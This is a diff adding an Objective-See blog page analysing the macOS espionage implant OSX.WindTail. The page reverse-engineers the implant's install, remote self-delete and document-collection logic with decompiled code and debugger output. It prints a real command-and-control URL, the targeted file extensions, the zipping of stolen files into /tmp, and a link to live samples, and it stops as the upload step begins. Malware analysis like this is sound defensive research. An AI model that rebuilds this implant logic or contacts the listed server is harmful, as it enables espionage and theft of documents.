@@ -1,0 +1,722 @@
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
+  <head>
+    <meta charset="UTF-8">
+    
+    <title>Objective-See's Blog</title>
+    
+    <link rel="shortcut icon" href="../images/logoApple.ico">
+    <link rel="stylesheet" type="text/css" href="../css/style.css">
+    <link href="../css/ss-social.css" rel="stylesheet" />
+    <link href="../css/ss-standard.css" rel="stylesheet" />
+    <link href="../css/timeline.css" rel="stylesheet" />
+    <link href="../css/table.css" rel="stylesheet" />
+    <link href="../css/new.css" rel="stylesheet" />
+    
+    <script src="../js/analytics.js"></script>
+    <script src="../js/sweetalert.min.js"></script>
+    <script src="../js/donationPopup.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.2/jquery.min.js"></script>
+    
+    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
+    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
+    
+    <meta http-equiv="Cache-Control" content="no-store" />
+    <meta http-equiv="cache-control" content="max-age=0" />
+    <meta http-equiv="cache-control" content="no-cache" />
+    <meta http-equiv="expires" content="0" />
+    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
+    <meta http-equiv="pragma" content="no-cache" />
+    
+    <link href="https://objective-see.com/rss.xml" rel="alternate" type="application/rss+xml" title="Objective-See's Blog Feed" />
+    
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:site" content="@objective_see" />
+<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x3D/knockknock.png />
+<meta name="twitter:title" content=Middle&#32;East&#32;Cyber-Espionage />
+<meta name="twitter:description" content=analyzing&#32;WindShift&#39;s&#32;implant:&#32;OSX.WindTail&#32;(part&#32;2) />
+    
+<meta property="og:type" content="article" />
+<meta property="og:title" content=Middle&#32;East&#32;Cyber-Espionage />
+<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x3D/knockknock.png />
+
+    </head>
+  <body>
+    <nav role="main">
+  <ul>
+    <li><a href="../index.html" class="menubutton logo">Objective See</a></li>
+    <li><a href="../about.html" class="menubutton about">about</a></li>
+    <li><a href="../malware.html" class="menubutton malware">malware</a></li>
+    <li><a href="https://speakerdeck.com/patrickwardle" class="menubutton talks">talks</a></li>
+    <li><a href="../blog.html" class="menubutton blog">blog</a></li>
+    <li><a href="../products.html" class="menubutton products">products</a></li>
+  </ul>
+</nav>
+    <div class="pageContent">
+      <hr class="gradient">
+      <br>
+      
+<section class="blogContent" style="padding-bottom:50px";>
+  <div class="blogTitle">Middle East Cyber-Espionage</div>
+  <div class="blogSubTitle">analyzing WindShift&#39;s implant: OSX.WindTail (part 2)</div>
+  <div class="blogDate">January 15, 2019</div>
+  
+
+<p><div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
+    <span class="n3rdFont">
+    Our research, tools, and writing, are supported by &ldquo;Friends of Objective-See&rdquo;
+    <br>
+    Today&rsquo;s blog post is brought to you by:
+    <br><br>
+    <table border="0" style="width:100%; border: none">
+    <tr style="width:100%;">
+    <td style="padding: 0px; border: none" border="0" align="center">
+    <a class="inlineLink" href="https://sophos.com/">
+      <img src="../images/friends/sophosText.png" width="250px;" style="display:block; margin:auto; padding-top: 20px;"/>
+    </a>
+    </td>
+    <td style="padding: 0px; border: none" border="0" align="center">
+      <a href="https://macpaw.com/" style="text-decoration: none;">
+      <img src="../images/friends/macpawText.png" width="250px;" style="display:block;  margin:auto; padding-top: 0px;"/>
+      </a>
+    </td>
+    </tr>
+  </table>
+  <br>
+  <center>
+      <a href="https://digitasecurity.com/" style="text-decoration: none;">
+      <img src="../images/friends/digitaText.png" width="300px;" style="display:block;  margin:auto; padding-top: 10px;"/>
+      </a>
+  </center>
+  <div align="right" style="padding-right:10px; padding-bottom:10px;">
+    <a href="https://objective-see.com/friends.html" class="inlineLink">become a friend!</a>
+  </div>
+  </span>
+</div>
+<br />
+</p>
+
+<div class="note"><p>&#x1F4DD; &#x1F47E; Want to play along?</p>
+
+<p>I’ve shared various <a href="https://objective-see.com/downloads/malware/WindTail.zip">OSX.WindTail samples</a> (password: infect3d)</p>
+
+<p>&hellip;please don’t infect yourself!</p>
+</div>
+
+<h3 id="background">Background</h3>
+
+<p>A few weeks ago, I posted <a href="blog_0x3B.html">part one</a> of this two-part blog series covering a the macOS exploits and implants used in a Middle East cyber-espionage operation.</p>
+
+<p>In that previous post we covered:</p>
+
+<ul>
+<li>the exploitation vector (custom URL schemes).</li>
+<li>finding previously undetected <code>OSX.WindTail</code> samples on VirusTotal</li>
+<li>the method of persistence (ab)used by the implant to achieve persistence (launch item).</li>
+<li>the decryption of the implants command and control servers (<code>flux2key.com/</code> and <code>string2me.com</code>).</li>
+</ul>
+
+<p>I&rsquo;d recommend reading (or re-reading!) <a href="blog_0x3B.html">part one</a>, as it serves as foundation research to this post.</p>
+
+<p>Today, we&rsquo;ll complete the analysis of <code>OSX.WindTail</code>, detailing it&rsquo;s installer and self-delete logic, and thru reverse-engineering uncover it&rsquo;s main capabilities.</p>
+
+<p>The malware&rsquo;s install logic and capabilities begin with the <code>tuffel</code> method, while the self-delete logic is found within the aptly named <code>mydel</code> method. Both methods are invoked by the malware&rsquo;s <code>applicationDidFinishLaunching</code> method:</p>
+
+<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-C" data-lang="Objective-C">-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">applicationDidFinishLaunching:</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg2 
+{
+  ...
+
+  [r15 tuffel];
+  [NSThread detachNewThreadSelector:<span style="color:#66d9ef">@selector</span>(mydel) toTarget:r15 withObject:<span style="color:#ae81ff">0x0</span>];
+
+}</code></pre></div>
+<br />
+<div class="note"><p>In this post, we&rsquo;ll focus on the sample of OSX.WindTail named <strong>Final_Presentation.app</strong>
+<br />
+(SHA1: 758F10BD7C69BD2C0B38FD7D523A816DB4ADDD90).</p>
+
+<p>This OSX.WindTail sample, along with a few others, may be download from our <a href="../malware.html">Mac Malware Collection</a>.</p>
+</div></p>
+
+<p><br />
+</p>
+
+<h3 id="osx-windtail-install-logic"><code>OSX.WindTail</code> Install Logic</h3>
+
+<p>As noted, in <code>OSX.WindTail</code>&rsquo;s <code>applicationDidFinishLaunching</code> method, the malware invokes a method named <code>tuffel</code>.</p>
+
+<div class="note"><p>Note:</p>
+
+<p>The <a href="https://developer.apple.com/documentation/appkit/nsapplicationdelegate/1428385-applicationdidfinishlaunching?language=objc">applicationDidFinishLaunching</a> method is a automatically invoked &ldquo;after the application has been launched and initialized&rdquo; -apple.com</p>
+
+<p>Thus, when analyzing malicious macOS applications, always investigate this method!</p>
+</div>
+
+<p>To see what class the <code>tuffel</code> method belongs to, we can use <a href="https://twitter.com/Morpheus______">Jonathan Levin</a>&rsquo;s incredible <a href="http://www.newosxbook.com/tools/jtool.html">jtool</a> utility.
+Specifically, via the <code>-v -d objc</code> commandline arguments <code>jtool</code> can dump the embedded Objective-C classes:</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+$ jtool -v -d objc Final_Presentation.app/Contents/MacOS/usrnode 
+
+@interface AppDelegate : ?
+...
+// 9 instance methods
+/* 0 - 0x100001d7d */ - applicationDidFinishLaunching:;
+/* 1 - 0x100001fc6 */ - mydel; 
+/* 2 - 0x1000021f4 */ - tuffel;
+/* 3 - 0x10000223f */ - yoop:; 
+...
+@end
+</pre>
+  </span>
+</div>
+
+<p>Via the <code>jtool</code> output, it is clear that this method, (along with other methods such as <code>mydel</code> and <code>yoop</code>) belongs to the malware&rsquo;s main <code>AppDelegate</code> class.</p>
+
+<p>By disassembling this method, one can see it allocates and initializes an <code>appdele</code> class, before invoking said class&rsquo;s <code>sis</code> method:
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-C" data-lang="Objective-C"><span style="color:#75715e">/* @class AppDelegate */</span>
+-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">tuffel</span> {
+    rax <span style="color:#f92672">=</span> [appdele alloc];
+    rax <span style="color:#f92672">=</span> [rax init];
+    self<span style="color:#f92672">-&gt;</span>tyt <span style="color:#f92672">=</span> rax;
+    [rax sis];
+    <span style="color:#66d9ef">return</span>;
+}</code></pre></div></p>
+
+<p>Taking a closer look at the <code>appdele</code>&rsquo;s <code>init</code> method, reveals that it invokes a method named <code>cp</code>:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-C" data-lang="Objective-C"><span style="color:#75715e">/* @class appdele */</span>
+-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">cp</span> {
+    r13 <span style="color:#f92672">=</span> self;
+    var_30 <span style="color:#f92672">=</span> r13;
+    <span style="color:#f92672">*</span>qword_100015f20 <span style="color:#f92672">=</span> [[NSFileManager alloc] init];
+    r15 <span style="color:#f92672">=</span> [[NSBundle mainBundle] bundlePath];
+    rbx <span style="color:#f92672">=</span> [r15 lastPathComponent];
+    r12 <span style="color:#f92672">=</span> NSHomeDirectory();
+    r8 <span style="color:#f92672">=</span> [r13 yoop:<span style="color:#e6db74">@&#34;oX0s4Qj3GiAzAnOmzGqjOA==&#34;</span>];
+    rcx <span style="color:#f92672">=</span> r12;
+    rbx <span style="color:#f92672">=</span> [NSString stringWithFormat:<span style="color:#e6db74">@&#34;%@%@%@%@&#34;</span>, rcx, r8, <span style="color:#e6db74">@&#34;/&#34;</span>, rbx];
+    
+    ...
+
+    <span style="color:#66d9ef">if</span> (([<span style="color:#f92672">*</span>qword_100015f20 copyItemAtPath:r15 toPath:rbx error:<span style="color:#ae81ff">0x0</span>] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x1</span>) 
+    	<span style="color:#66d9ef">goto</span> loc_10000297b;
+
+    <span style="color:#66d9ef">return</span>;
+
+loc_10000297b:
+    rdi <span style="color:#f92672">=</span> var_30;
+    rdx <span style="color:#f92672">=</span> rbx;
+    <span style="color:#66d9ef">goto</span> loc_100002989;
+
+loc_100002989:
+    [rdi cmd:rdx];
+    sleep(<span style="color:#ae81ff">0x1e</span>);
+    exit(<span style="color:#ae81ff">0x0</span>);
+    <span style="color:#66d9ef">return</span>;</code></pre></div>
+
+<p>&hellip;yes, a decent amount of logic here, but with the help of some dynamic analysis (via <code>lldb</code>), it&rsquo;s not too bad to break down.</p>
+
+<p>First, the malware gets the path to it&rsquo;s own application bundle via <code>[[NSBundle mainBundle] bundlePath]</code>. After getting retrieving the bundle&rsquo;s name (via the <code>lastPathComponent</code> method) the malware invokes the <code>NSHomeDirectory</code> function to get the user&rsquo;s home directory. And what about the encoded, encrypted string, <code>oX0s4Qj3GiAzAnOmzGqjOA==</code>? That decrypts to &ldquo;<code>/Library</code>&ldquo;:</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+(lldb)
+
+0x100002873 <+125>: movq   0x12bce(%rip), %rsi       ; "yoop:"
+0x10000287a <+132>: leaq   0x10ddf(%rip), %rdx       ; @"oX0s4Qj3GiAzAnOmzGqjOA=="
+0x100002881 <+139>: movq   %r13, %rdi
+0x100002884 <+142>: callq  *%r14
+
+...
+
+//after stepping over callq  *%r14
+
+(lldb) po $rax
+/Library
+</pre>
+  </span>
+</div>
+
+<p>These &lsquo;pieces&rsquo; are all passed to the <code>stringWithFormat</code> method, to build the following string: <code>/Users/user/Library/Final_Presentation.app</code>.</p>
+
+<p><code>OSX.WindTail</code> then invokes the <code>copyItemAtPath</code> method to copy (install) itself to the <code>~/Library/</code> directory:</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+(lldb) po $rdi
+&lt;NSFileManager: 0x1001221e0&gt;
+
+(lldb) x/s $rsi
+0x7fff6cabf632: "copyItemAtPath:toPath:error:"
+
+(lldb) po $rdx
+/Users/user/Desktop/Final_Presentation.app
+
+(lldb) po $rcx
+/Users/user/Library/Final_Presentation.app
+</pre>
+  </span>
+</div>
+
+<p>Via macOS&rsquo;s built-in file monitor utility, <code>fs_usage</code>, we can passively observe this installation:</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+# fs_usage -w -f filesystem | grep -i usrnode
+open  /Users/user/Desktop/Final_Presentation.app
+mkdir /Users/user/Library/Final_Presentation.app
+...
+
+</pre>
+  </span>
+</div>
+
+<p>Though the normal user won&rsquo;t likely be poking around in the <code>~/Library</code> folder - if they did (and their Mac was infected with <code>OSX.WindTail</code>), the malware is rather hard to miss:</p>
+
+<img src="../images/blog/blog_0x3D/installed.png"  width="" class="center" style="margin-top:10px">
+
+
+<p>In <a href="blog_0x3B.html">part one</a> we covered <code>OSX.WindTail</code>&rsquo;s persistence (via a login item). This persistence, combined with the above installer logic, completes the persistent install. This of course ensures that the malware will be automatically (re)started anytime the user logs into the infected system.</p>
+
+<img src="../images/blog/blog_0x3D/knockknock.png"  width="" class="center" style="margin-top:10px">
+
+
+<p><br />
+</p>
+
+<h3 id="osx-windtail-self-delete-logic"><code>OSX.WindTail</code> Self-Delete Logic</h3>
+
+<p>Recall the malware&rsquo;s implementation of the <code>applicationDidFinishLaunching</code> method:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-C" data-lang="Objective-C">-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">applicationDidFinishLaunching:</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)arg2 
+{
+  ...
+
+  [r15 tuffel];
+  [NSThread detachNewThreadSelector:<span style="color:#66d9ef">@selector</span>(mydel) toTarget:r15 withObject:<span style="color:#ae81ff">0x0</span>];
+
+}</code></pre></div>
+
+<p>Note that at the end, the malware spins off a new thread (via the <code>detachNewThreadSelector</code> method), to execute a method named <code>mydel</code>.</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-C" data-lang="Objective-C"><span style="color:#75715e">/* @class AppDelegate */</span>
+-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">mydel</span> {
+    
+    ...
+    r14 <span style="color:#f92672">=</span> [NSString stringWithFormat:<span style="color:#e6db74">@&#34;%@&#34;</span>, [self yoop:<span style="color:#e6db74">@&#34;F5Ur0CCFMO/fWHjecxEqGLy/...&#34;</span>]];
+    
+    rbx <span style="color:#f92672">=</span> [[NSMutableURLRequest alloc] init];
+    [rbx setURL:[NSURL URLWithString:r14]];
+    
+    ...
+    <span style="color:#66d9ef">if</span> ([[[NSString alloc] initWithData:[NSURLConnection sendSynchronousRequest:rbx 
+    	returningResponse:<span style="color:#ae81ff">0x0</span> error:<span style="color:#ae81ff">0x0</span>] encoding:<span style="color:#ae81ff">0x4</span>] isEqualToString:<span style="color:#e6db74">@&#34;1&#34;</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) {
+            
+            r14 <span style="color:#f92672">=</span> [NSFileManager defaultManager];
+            rdx <span style="color:#f92672">=</span> [[NSBundle mainBundle] bundlePath];
+            
+            [r14 removeItemAtPath:rdx error:rcx];
+
+            [[NSApplication sharedApplication] terminate:<span style="color:#ae81ff">0x0</span>, rcx];
+    }
+
+    <span style="color:#66d9ef">return</span>;
+}</code></pre></div>
+
+<p>In short, the <code>mydel</code> method performs the following:</p>
+
+<ul>
+<li>Generates a URL request from an encrypted string.</li>
+<li>Makes a network request to this URL</li>
+<li>If the request returns a string that equals &ldquo;1&rdquo;:
+
+<ul>
+<li>Deletes itself</li>
+<li>Terminate itself</li>
+</ul></li>
+</ul>
+
+<p>Via <code>lldb</code> we can set a breakpoint on this method (at address <code>0x0000000100001fc6</code>) then, step thru this code to uncover the (decrypted) URL:</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+(lldb) b 0x0000000100001fc6
+(lldb) c
+...
+
+->  0x100002034 <+110>: movq   0x1340d(%rip), %rsi       ; "yoop:"
+    0x10000203b <+117>: leaq   0x113de(%rip), %rdx       ; @"F5Ur0CCFMO/fWHjecxEqGLy/xq5gE98ZviUSLr..."
+    0x100002042 <+124>: movq   %r14, %rdi
+    0x100002045 <+127>: callq  *%r13
+
+...
+
+//after stepping over `callq  *%r13`
+(lldb) po $rax
+<b>http://flux2key.com/liaROelcOeVvfjN/fsfSQNrIyxeRvXH.php?very=%@&xnvk=%@</b>
+</pre>
+  </span>
+</div>
+
+<p>Continuing to single-step over the instructions in this method reveal the full URL:
+<code>http://flux2key.com/liaROelcOeVvfjN/fsfSQNrIyxeRvXH.php?very=MTUwMTIwMTkxNDI0MDc1&amp;xnvk=ss</code></p>
+
+<p>Enabling the network adapter in the VM, allows this network request, which we capture in <a href="https://www.wireshark.org">WireShark</a>:</p>
+
+<p><img src="../images/blog/blog_0x3D/wireshark.png"  width="1000" class="center" style="margin-top:10px">
+
+<br />
+<div class="note"><p>Note:</p>
+
+<p>The malware&rsquo;s command &amp; control server (flux2key.com) currently returns a 403 &lsquo;Forbidden&rsquo; error</p>
+</div></p>
+
+<p>As noted, if the command &amp; control server returns a string equal to <code>&quot;1&quot;</code>, the malware will self delete, then exit:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-C" data-lang="Objective-C"><span style="color:#75715e">/* @class AppDelegate */</span>
+-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">mydel</span> {
+
+	...
+
+	<span style="color:#75715e">// if the C&amp;C server returns &#34;1&#34;
+</span><span style="color:#75715e"></span>	<span style="color:#75715e">//  then self delete and terminate 
+</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> ([[[NSString alloc] initWithData:[NSURLConnection sendSynchronousRequest:rbx 
+    	returningResponse:<span style="color:#ae81ff">0x0</span> error:<span style="color:#ae81ff">0x0</span>] encoding:<span style="color:#ae81ff">0x4</span>] isEqualToString:<span style="color:#e6db74">@&#34;1&#34;</span>] <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0</span>) 
+  	{	
+		<span style="color:#75715e">//self-delete
+</span><span style="color:#75715e"></span>    	[[NSFileManager defaultManager] removeItemAtPath:[[NSBundle mainBundle] bundlePath] ...];
+            
+    	<span style="color:#75715e">//terminate
+</span><span style="color:#75715e"></span>		[[NSApplication sharedApplication] terminate:<span style="color:#ae81ff">0x0</span> ...];
+	}
+    ...
+}</code></pre></div>
+
+<p>&hellip;rather neat to see a &ldquo;remotely triggerable&rdquo; self-deletion capability built directly into the malware!</p>
+
+<p><br />
+</p>
+
+<h3 id="osx-windtail-payload-capabilities"><code>OSX.WindTail</code> Payload/Capabilities</h3>
+
+<p>In <a href="blog_0x3B.html">part one</a> of this two-part blog post, we&rsquo;ve detailed how <code>OSX.WindTail</code> infects Macs (via (ab)using custom URL schemes), and how it persists (via login items). In this post, we&rsquo;ve detailed the installer and self-deleting logic. But the question remains, what does the malware actually do. In other words, what is its main goal?</p>
+
+<p>We start in a method called <code>yan</code>. This method is invoked automatically when the malware starts via (<code>applicationDidFinishLaunching</code> -&gt; <code>tuffel</code> -&gt; (<code>appdele</code>) <code>init</code>). This decompliation of this method reveals little&hellip;though it does appear that the method is decrypting a bunch of encrypted strings:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-C" data-lang="Objective-C"><span style="color:#75715e">/* @class appdele */</span>
+-(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">yan</span> {
+    var_30 <span style="color:#f92672">=</span> [self yoop:<span style="color:#e6db74">@&#34;BouCfWujdfbAUfCos/iIOg==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;Bk0WPpt0IFFT30CP6ci9jg==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;RYfzGQY52uA9SnTjDWCugw==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;XCrcQ4M8lnb1sJJo7zuLmQ==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;3J1OfDEiMfxgQVZur/neGQ==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;Nxv5JOV6nsvg/lfNuk3rWw==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;Es1qIvgb4wmPAWwlagmNYQ==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;eOA0XJNs/eeFUVMThfZjTA==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;B/9RICA+yl4vZrIeyON8cQ==&#34;</span>];
+    [self yoop:<span style="color:#e6db74">@&#34;B8fvRmZ1LJ74Q5OiD9KISw==&#34;</span>];
+
+    rax <span style="color:#f92672">=</span> [NSMutableArray arrayWithObjects:var_30];
+    <span style="color:#66d9ef">return</span> rax;
+}</code></pre></div>
+
+<p>As the method appears to return an array of the decrypted strings, lets hop into the debugger (<code>lldb</code>) and set a breakpoint on the method (address: <code>0x000000010000238b</code>). Once this breakpoint is hit, executing lldb&rsquo;s <code>finish</code> command will execute the entire method, then stop as soon as it returns. Here, we can dump the array of decrypted strings!</p>
+
+<p><div class="note"><p>Note:</p>
+
+<p>The x64 ABI for macOS dedicates that the return value of a method or function is stored in the RAX register. In other words, once a method (of function) returns, simply display what&rsquo;s in the RAX register, to see what&rsquo;s returned (e.g. an array of decrypted strings).</p>
+</div>
+<br />
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+(lldb) b 0x000000010000238b
+(lldb) c
+...
+
+->  0x10000238b <+0>: pushq  %rbp
+    0x10000238c <+1>: movq   %rsp, %rbp
+    0x10000238f <+4>: pushq  %r15
+    0x100002391 <+6>: pushq  %r14
+
+(lldb) finish
+
+(lldb) po $rax
+<__NSArrayM 0x10018f920>(
+ doc, docx, ppt, pdf, xls,
+ xlsx, db, txt, rtf, pptx)
+</pre>
+  </span>
+</div></p>
+
+<p>Ah, a list of file extensions&hellip; likely ones that the malware is interested in, in some reason &#x1F914;</p>
+
+<p>Next we move on to looking at the <code>fist</code> method (invoked via the <code>df</code> method, which is scheduled via an <code>NSTimer</code>).</p>
+
+<div class="note"><p>Note:</p>
+
+<p>The df method (which invokes the fist method), first invokes a &lsquo;isOK&rsquo; method.</p>
+
+<p>In a debugger, we can force this check to always succeed (such that the <code>fist</code> method will be invoked) by simply settings the return value to a non-zero value:
+<strong>(lldb) reg write $rax 1</strong></p>
+</div>
+
+<p>The <code>fist</code> method is rather large, but perusing it&rsquo;s decompilation reveals it invoking Apple APIs such as <code>contentsOfDirectoryAtPath</code>, <code>pathExtension</code>, and (string) <code>compare</code>. Seems reasonable to assume it enumerating files, perhaps looking for files that match the previously decrypted file extensions?</p>
+
+<p>Setting various breakpoints within the method reveals the malware enumerating and building a list of directories:</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+(lldb) po $rdi
+
+<__NSArrayM 0x10018e360>(
+/Library,
+/net,
+/Network,
+/private,
+/sbin,
+/System,
+/Users,
+/usr,
+/vm,
+/Volumes,
+/Applications/App Store.app,
+/Applications/Automator.app,
+/Applications/Calculator.app,
+/Applications/Calendar.app,
+/Applications/Chess.app,
+/Applications/Contacts.app,
+/Applications/Dashboard.app,
+/Applications/Dictionary.app,
+/Applications/DVD Player.app,
+...
+</pre>
+  </span>
+</div>
+
+<p>More interestingly, this method adds files that match the (previously) decrypted file extensions (<code>doc</code>, <code>db</code>, <code>rtf</code>, etc&hellip;) to an array (named <code>honk</code>):</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+(lldb) po $rdx
+<__NSArrayM 0x1001aafc0>(
+{
+    "KEY_ATTR" =     {
+        NSFileCreationDate = "2017-07-26 01:37:05 +0000";
+        NSFileExtensionHidden = 0;
+        NSFileGroupOwnerAccountID = 0;
+        NSFileGroupOwnerAccountName = wheel;
+        NSFileHFSCreatorCode = 0;
+        NSFileHFSTypeCode = 0;
+        NSFileModificationDate = "2017-07-26 01:37:05 +0000";
+        NSFileOwnerAccountID = 0;
+        NSFileOwnerAccountName = root;
+        NSFilePosixPermissions = 420;
+        NSFileReferenceCount = 1;
+        NSFileSize = 1159906;
+        NSFileSystemFileNumber = 548707;
+        NSFileSystemNumber = 16777218;
+        NSFileType = NSFileTypeRegular;
+    };
+    "KEY_PATH" = "/Library/Documentation/Acknowledgements.rtf";
+},
+{
+    "KEY_ATTR" =     {
+        NSFileCreationDate = "2017-09-26 06:58:34 +0000";
+        NSFileExtensionHidden = 0;
+        NSFileGroupOwnerAccountID = 0;
+        NSFileGroupOwnerAccountName = wheel;
+        NSFileHFSCreatorCode = 0;
+        NSFileHFSTypeCode = 0;
+        NSFileModificationDate = "2017-09-26 07:01:34 +0000";
+        NSFileOwnerAccountID = 0;
+        NSFileOwnerAccountName = root;
+        NSFilePosixPermissions = 420;
+        NSFileReferenceCount = 1;
+        NSFileSize = 57344;
+        NSFileSystemFileNumber = 890895;
+        NSFileSystemNumber = 16777218;
+        NSFileType = NSFileTypeRegular;
+    };
+    "KEY_PATH" = "/Library/Application Support/com.apple.TCC/TCC.db";
+},
+{
+    "KEY_ATTR" =     {
+        NSFileCreationDate = "2017-07-15 23:45:04 +0000";
+        NSFileExtensionHidden = 0;
+        NSFileGroupOwnerAccountID = 0;
+        NSFileGroupOwnerAccountName = wheel;
+        NSFileHFSCreatorCode = 0;
+        NSFileHFSTypeCode = 0;
+        NSFileModificationDate = "2017-07-15 23:45:04 +0000";
+        NSFileOwnerAccountID = 0;
+        NSFileOwnerAccountName = root;
+        NSFilePosixPermissions = 384;
+        NSFileReferenceCount = 1;
+        NSFileSize = 272;
+        NSFileSystemFileNumber = 869137;
+        NSFileSystemNumber = 16777218;
+        NSFileType = NSFileTypeRegular;
+    };
+    "KEY_PATH" = "/private/etc/racoon/psk.txt";
+}
+)
+
+</pre>
+  </span>
+</div>
+
+<p>For each of the files that the <code>fist</code> method adds to the <code>honk</code> array, the malware invokes a method, aptly named <code>zip</code>, which appears to invoke <code>/usr/bin/zip</code> to create an archive of the file:</p>
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-Objective-c" data-lang="Objective-c"><span style="color:#75715e">/* @class image */</span>
+-(<span style="color:#66d9ef">void</span>)<span style="color:#a6e22e">zip</span> {
+    
+    r14 <span style="color:#f92672">=</span> [<span style="color:#e6db74">@&#34;/tmp/&#34;</span> stringByAppendingPathComponent:[rbx<span style="color:#f92672">-&gt;</span>m_filePath lastPathComponent]];
+  	...
+    rax <span style="color:#f92672">=</span> [r14 stringByAppendingString:<span style="color:#e6db74">@&#34;.zip&#34;</span>];
+    
+    ...
+    rax <span style="color:#f92672">=</span> (r14)(@<span style="color:#66d9ef">class</span>(NSArray), <span style="color:#66d9ef">@selector</span>(arrayWithObjects:), <span style="color:#e6db74">@&#34;/usr/bin/zip&#34;</span>, <span style="color:#f92672">*</span>(rbx <span style="color:#f92672">+</span> r12), rbx<span style="color:#f92672">-&gt;</span>m_filePath, <span style="color:#ae81ff">0x0</span>);
+    rax <span style="color:#f92672">=</span> (r14)(r15, <span style="color:#66d9ef">@selector</span>(initWithController:arguments:), rbx, rax);
+    <span style="color:#f92672">*</span>(rbx <span style="color:#f92672">+</span> r13) <span style="color:#f92672">=</span> rax;
+    (r14)(rax, <span style="color:#66d9ef">@selector</span>(startProcess), rbx);
+    <span style="color:#66d9ef">return</span>;
+}</code></pre></div>
+
+<p>Via Objective-See&rsquo;s open-source <a href="https://github.com/objective-see/ProcInfo">ProcInfo</a> process monitoring utility, we can confirm that the malware does indeed spawn macOS&rsquo;s built-in <code>zip</code> utility to create a archive containing containing the file (here for example, a pdf named: <code>StopTemplate.pdf</code>):</p>
+
+<div style="border: 1px solid gray; padding: 20px; margin-top:10px; overflow-wrap: break-word; background-color:black; color:lime;">
+  <span class="n3rdFont">
+    <pre>
+# ./procInfo
+
+[ process start]
+pid: 1202
+path: /usr/bin/zip
+args: (
+    "/usr/bin/zip",
+    "/tmp/StopTemplate.pdf.zip",
+    "/Applications/Automator.app/Contents/Resources/StopTemplate.pdf"
+)
+</pre>
+  </span>
+</div>
+
+<p>Once the file has been zipped up, the malware invokes a method named <code>upload</code>:</p>
+
